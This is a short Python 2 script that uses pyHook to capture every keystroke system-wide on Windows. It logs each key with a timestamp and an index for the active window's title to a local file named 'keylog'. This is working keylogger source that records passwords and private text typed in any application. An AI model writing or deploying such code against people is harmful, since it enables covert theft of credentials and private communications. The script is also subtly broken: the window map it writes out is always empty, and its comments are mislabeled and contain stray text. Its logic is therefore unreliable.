import pythoncom, pyHook
import json
import codecs 
from tendo import singleton
from pytz import timezone
from datetime import datetime
import ctypes, ctypes.wintypes

global get_keywin_names
                                                                            
win = {}

def get_keywin_names(o): 

        x = str(o) 
        f = open("keywin.txt","r")
        for ol in f:
            win = json.loads(ol)
            if x.decode('utf-8','replace') in  win.keys(): 
                return win.get(x.decode('utf-8','replace'))  
            else:
                if win.values() != []:
                    win[x.decode('utf-8','replace')]=sorted(win.values())[-1 ]+1
                    return win[x.decode('utf-8','replace')]
                else:
                    return 1

def OnKeyboardEvent(event):        
        s = ""    
        s += str(event.Time)+","
        s += str(get_keywin_names(event.WindowName))+"," 
        s += str(event.Ascii)
        s += str(event.Key) 
        s += "\n" 
        f = open("keylog","a") 
        f.write(s) 
        h = open("keywin.txt",'w')
        json.dump(win, h)
         
         
        f.close() 
    # return True to pass the event to other handlers
        return True
     
# for single instance 
me = singleton.SingleInstance() 
# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events 
hm.KeyDown = OnKeyboardEvent
# watch for all mouse events
#hm.MouseAll = OnMouseEvent
# set the hook
hm.HookKeyboard()
# set the hook
hm.HookMouse()
# wait foreverhai srinath 
pythoncom.PumpMessages()
    


